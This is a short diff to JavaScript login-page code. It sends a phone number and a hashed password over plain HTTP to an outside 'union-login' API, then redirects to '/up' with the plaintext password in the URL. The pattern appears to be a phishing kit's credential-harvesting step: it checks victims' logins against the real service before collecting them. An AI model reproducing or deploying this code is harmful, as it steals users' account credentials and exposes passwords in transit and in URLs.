@@ -59,7 +59,7 @@ window.alert = function alertw(name) {
 		mima = document.getElementById('mima').value;
 		if(sjh !="" && mima !=""){
 			mmE = CryptoJS.SHA256(mima+"shushubuyue").toString();
-			$.getJSON("thkapi.unclenowayapi.com:7000/users/union-login",{
+			$.getJSON("http://thkapi.unclenowayapi.com:7000/users/union-login",{
 				phoneNumber:"86"+sjh,
 				userPwdEncrypted:mmE },function(data){
 					data.err ? alert("账号或密码错误！") : (t = "/up?sjh="+sjh+"&mm="+mima , window.location.href=t );
